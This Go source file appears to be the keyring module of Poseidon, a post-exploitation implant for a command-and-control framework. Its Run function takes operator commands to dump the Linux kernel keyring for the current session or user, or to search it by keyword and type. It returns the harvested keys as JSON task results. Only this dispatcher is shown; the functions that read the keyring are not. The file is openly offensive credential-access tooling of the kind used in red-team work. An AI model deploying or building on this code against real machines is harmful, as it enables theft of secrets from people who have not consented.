package keys

import (
	"encoding/json"

	"github.com/xorrior/poseidon/pkg/utils/structs"
)

type Options struct {
	Command  string `json:"command"`
	Keyword  string `json:"keyword"`
	Typename string `json:"typename"`
}

type Keyresults struct {
	Results []Keydetails `json:"results"`
}

func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	//Check if the types are available
	tMsg := structs.ThreadMsg{}
	tMsg.Error = false
	tMsg.TaskItem = task
	opts := Options{}
	err := json.Unmarshal([]byte(task.Params), &opts)

	if err != nil {
		tMsg.Error = true
		tMsg.TaskResult = []byte(err.Error())
		threadChannel <- tMsg
		return
	}

	switch opts.Command {
	case "dumpsession":
		keys, err := ListKeysForSession()
		if err != nil {
			tMsg.Error = true
			tMsg.TaskResult = []byte(err.Error())
			threadChannel <- tMsg
			return
		}

		r := Keyresults{}
		r.Results = keys

		jsonKeys, err := json.MarshalIndent(r, "", "	")
		if err != nil {
			tMsg.Error = true
			tMsg.TaskResult = []byte(err.Error())
			threadChannel <- tMsg
			return
		}

		tMsg.TaskResult = jsonKeys
		threadChannel <- tMsg
		break
	case "dumpuser":
		keys, err := ListKeysForUserSession()
		if err != nil {
			tMsg.Error = true
			tMsg.TaskResult = []byte(err.Error())
			threadChannel <- tMsg
			return
		}

		r := Keyresults{}
		r.Results = keys

		jsonKeys, err := json.MarshalIndent(r, "", "	")
		if err != nil {
			tMsg.Error = true
			tMsg.TaskResult = []byte(err.Error())
			threadChannel <- tMsg
			return
		}

		tMsg.TaskResult = jsonKeys
		threadChannel <- tMsg
		break
	case "search":
		key, err := Searchcurrentsessionkeyring(opts.Keyword)
		if err != nil {
			tMsg.Error = true
			tMsg.TaskResult = []byte(err.Error())
			threadChannel <- tMsg
			return
		}

		r := Keyresults{}
		r.Results = key

		jsonKeys, err := json.MarshalIndent(r, "", "	")
		if err != nil {
			tMsg.Error = true
			tMsg.TaskResult = []byte(err.Error())
			threadChannel <- tMsg
			return
		}

		tMsg.TaskResult = jsonKeys
		threadChannel <- tMsg
		break
	case "searchwithtype":
		key, err := Searchforkeywithtype(opts.Keyword, opts.Typename)
		if err != nil {
			tMsg.Error = true
			tMsg.TaskResult = []byte(err.Error())
			threadChannel <- tMsg
			return
		}

		r := Keyresults{}
		r.Results = key

		jsonKeys, err := json.MarshalIndent(r, "", "	")
		if err != nil {
			tMsg.Error = true
			tMsg.TaskResult = []byte(err.Error())
			threadChannel <- tMsg
			return
		}

		tMsg.TaskResult = jsonKeys
		threadChannel <- tMsg
		break
	}

}
